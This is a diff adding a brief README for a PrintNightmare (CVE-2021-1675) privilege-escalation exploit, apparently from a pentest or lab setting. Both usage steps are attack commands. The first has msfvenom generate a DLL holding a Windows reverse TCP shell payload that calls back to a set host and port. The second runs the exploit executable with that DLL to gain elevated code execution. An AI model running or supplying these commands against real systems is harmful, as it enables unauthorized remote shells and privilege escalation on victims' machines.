@@ -1,0 +1,9 @@
+# CVE-2021-1675 - PrintNightmare
+
+Usage:
+
+1) generate the dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.63 LPORT=8080  -f dll -v work8080.dll
+
+2) Execute the exploit
+c:\temp\CVE-2021-1675-LPE.exe c:\temp\work8080.dll
